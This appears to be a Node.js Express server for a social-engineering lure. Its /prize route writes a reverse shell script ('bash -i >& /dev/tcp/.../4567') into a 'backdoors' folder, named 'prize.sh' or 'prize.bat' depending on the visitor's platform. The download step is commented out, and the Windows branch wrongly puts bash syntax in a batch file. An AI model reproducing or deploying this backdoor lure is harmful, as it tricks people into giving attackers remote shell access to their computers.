import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { createReadStream, writeFile } from "node:fs";

import express from "express";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();

app.set("view engine", "ejs");
app.set("views", join(__dirname, "views"));

app.use(express.json());
app.use(express.static(join(__dirname, "public")));
app.get("/", (req, res) => {
	res.render("index");
});

app.post("/prize", (req, res) => {
	const clientIP = req.ip;

	let filepath;
	let filename;
	const { platform } = req.body;
	if (platform === "windows") {
		filepath = join(__dirname, "..", "backdoors", "backdoor.bat");
		filename = "prize.bat";
		writeFile(
			filepath,
			`@echo off\nbash -i >& /dev/tcp/${clientIP}/4567 0>&1`,
			(err) => {
				if (err) console.error(err);
			}
		);
	} else {
		filepath = join(__dirname, "..", "backdoors", "backdoor.sh");
		filename = "prize.sh";
		writeFile(
			filepath,
			`#!/bin/bash\nbash -i >& /dev/tcp/${clientIP}/4567 0>&1`,
			(err) => {
				if (err) console.error(err);
			}
		);
	}
	// res.download(filepath, filename, (err) => {
	// 	if (err) console.error(err);
	// });

	// res.attachment(filepath).send();

	// const stream = createReadStream(filepath);
	// res.setHeader("Content-Type", "application/x-sh");
	// res.setHeader("Content-Disposition", "inline; filename='prize.sh'");
   // stream.pipe(res);
});

export default app;
